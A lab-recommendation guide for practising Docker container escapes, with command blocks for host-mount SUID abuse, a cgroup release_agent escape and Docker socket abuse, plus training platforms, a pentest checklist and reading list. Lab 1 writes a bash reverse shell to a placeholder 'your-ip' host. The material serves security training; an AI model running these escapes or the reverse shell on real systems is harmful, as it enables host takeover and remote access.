# Container Escape Lab Recommendations

## Local Docker Labs (Safe to Run Locally)

### Lab 1: SUID + Sensitive Mount
**Goal:** Practice finding and abusing host-mounted paths
```bash
docker run -it --rm -v /tmp/shared:/shared ubuntu:22.04
# Inside container
id
mount | grep shared
echo '#!/bin/bash' > /shared/pwn
echo 'bash -i >& /dev/tcp/your-ip/4444 0>&1' >> /shared/pwn
chmod +x /shared/pwn
chmod u+s /shared/pwn
exit
# On host
/tmp/shared/pwn
```

### Lab 2: cgroup release_agent
**Goal:** Test cgroup escape technique
```bash
docker run -it --rm --privileged=true ubuntu:22.04
# Check writable cgroups
find /sys/fs/cgroup -writable -type d 2>/dev/null
# Create cgroup and trigger release_agent
mkdir -p /sys/fs/cgroup/test/escape
echo 1 > /sys/fs/cgroup/test/escape/notify_on_release
echo '#!/bin/sh' > /attack.sh
echo 'id > /tmp/pwned' >> /attack.sh
chmod +x /attack.sh
echo /attack.sh > /sys/fs/cgroup/test/escape/release_agent
echo 0 > /sys/fs/cgroup/test/escape/cgroup.procs
# On host: check /tmp/pwned after task finishes
```

### Lab 3: Runtime Socket (Docker-in-Docker style)
**Goal:** Mount Docker socket and create privesc container
```bash
docker run -it -v /var/run/docker.sock:/var/run/docker.sock docker:latest
docker ps
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```

---

## TryHackMe Modules

| Room | Focus | URL Pattern |
|---|---|---|
| Docker Security | Docker escape basics | `tryhackme.com/room/dockersecurity` |
| Kubernetes Security | Pod escape, misconfigs | `tryhackme.com/room/kubernetessecurity` *(check current THM)* |
| Cloud Adjacent | Sensitive mounts, socket abuse | Search “container escape” on THM |
| Linux Privilege Escalation | SUID, capabilities | `tryhackme.com/room/linprivesc` |

---

## Online / Browser Labs

| Platform | Lab | Notes |
|---|---|---|
| **Killercoda** | Docker & K8s escape scenarios | Free browser-based K8s |
| **Katacoda** | Docker security scenarios | Archived but still functional |
| **Wiz.io Leaky Vessels** | runC/BuildKit escapes | Read + lab |
| **HackTheBox** | Container escape machines | e.g., *Pentester* paths |

---

## CTF / VulnHub

- VulnHub: search “Docker escape” images
- CTFs: look for challenges with `docker.sock`, cgroup, SUID in shared volumes

---

## Pentest Checklist

```
[ ] Capabilities: cap_sys_admin, cap_sys_ptrace, cap_sys_chroot
[ ] Mounted runtime sockets
[ ] /proc, /sys, /dev exposure
[ ] Writable cgroups and release_agent
[ ] Host path bind mounts
[ ] SUID binaries in shared dirs
[ ] Kubernetes pod security policies (runAsNonRoot, readOnlyRootFilesystem)
[ ] Kubelet log mounts
```

---

## Docs to Read Alongside Labs

- Linux capabilities(7), namespaces(7)
- runC docs + CVE-2019-5736 writeup
- Docker security docs (`no_new_privs`, seccomp)
- Kubernetes Pod Security Standards (restricted)
- `A Compendium of Container Escapes` (Brandon Edwards, Nick Freeman — Black Hat USA 2019)

---

## Output Goal

Turn each lab into a writeup with:
1. Setup
2. Enumeration commands
3. Exploitation steps
4. Detection points
5. Remediation
